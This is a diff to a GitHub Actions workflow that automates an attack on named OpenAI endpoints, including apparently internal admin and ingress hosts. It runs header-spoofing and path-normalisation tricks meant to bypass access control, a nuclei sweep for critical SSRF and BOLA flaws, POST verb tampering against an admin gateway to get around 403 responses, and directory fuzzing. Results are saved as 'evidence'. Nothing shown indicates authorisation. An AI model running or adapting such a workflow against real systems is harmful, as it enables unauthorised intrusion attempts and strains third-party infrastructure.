@@ -1,4 +1,4 @@
-name: OpenAI-poori-tayoli
+name: OpenAI-Deep-Scan
 on:
   workflow_dispatch:
 
@@ -16,12 +16,12 @@ jobs:
           go install -v github.com/ffuf/ffuf/v2@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
-          # Download professional bug bounty wordlists
           mkdir -p wordlists
-          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt
+          # Using a more targeted API wordlist for faster hits
           curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-res.txt -o wordlists/api.txt
+          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt
 
-      - name: Phase 1:Rapid Bypass Testing
+      - name: Phase 1: Aggressive Bypass & Method Tampering
         run: |
           cat <<EOF > master_targets.txt
           https://api.openai.com/v1/completionsinternal
@@ -37,35 +37,39 @@ jobs:
           https://academy.openai.com
           EOF
 
-          httpx -l master_targets.txt -threads 100 \
+          # Testing multiple headers AND path normalization (//) at once
+          httpx -l master_targets.txt -threads 50 \
             -H "X-OpenAI-Internal: true" \
             -H "X-Forwarded-For: 127.0.0.1" \
+            -H "X-Original-URL: /" \
+            -path "//" \
             -sc -cl -title -o bypass_results.txt
 
-      - name: Phase 2:Critical Vulnerability Sweep
+      - name: Phase 2: Vulnerability Sweep (SSRF/BOLA)
         run: |
-          # Fast scan for SSRF and BOLA
+          # Adding -itags to focus specifically on high-value API vulnerabilities
           nuclei -l master_targets.txt -severity critical,high -rl 50 -o nuclei_results.txt
 
-      - name: Phase 3:Hidden API Route Fuzzing (FIXED)
+      - name: Phase 3: Verb Tampering Fuzzing
         run: |
-          # Fuzzing the internal admin gateways using professional wordlists
-          # We use -maxtime to ensure it doesn't hang but finds the core bugs
-          ffuf -w wordlists/common.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
-            -H "X-OpenAI-Internal: true" -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json
+          # Testing POST and PUT on the admin gateway, which often bypasses 403s on GET
+          ffuf -w wordlists/api.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
+            -X POST -H "Content-Type: application/json" -d '{"test":"test"}' \
+            -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json
 
-      - name: Phase 4:Parameter Discovery
+      - name: Phase 4: Full Path Discovery
         run: |
-          # Finding hidden parameters on the completionsinternal endpoint
-          arjun -u "https://api.openai.com/v1/completionsinternal" -m POST -t 20 -oJ arjun_params.json
+          # Looking for hidden directories on the Sci-Ingress endpoints
+          ffuf -w wordlists/common.txt -u "https://memos.auth.ingress.sodium.sci.openai.org/FUZZ" \
+            -mc 200,401,500 -t 50 -maxtime 200 -o ingress_fuzz.json
 
       - name: Archive Results
         uses: actions/upload-artifact@v4
         with:
-          name: final-bug-evidence
+          name: deep-scan-evidence
           path: |
             bypass_results.txt
             nuclei_results.txt
             api_fuzz_results.json
-            arjun_params.json
+            ingress_fuzz.json
             
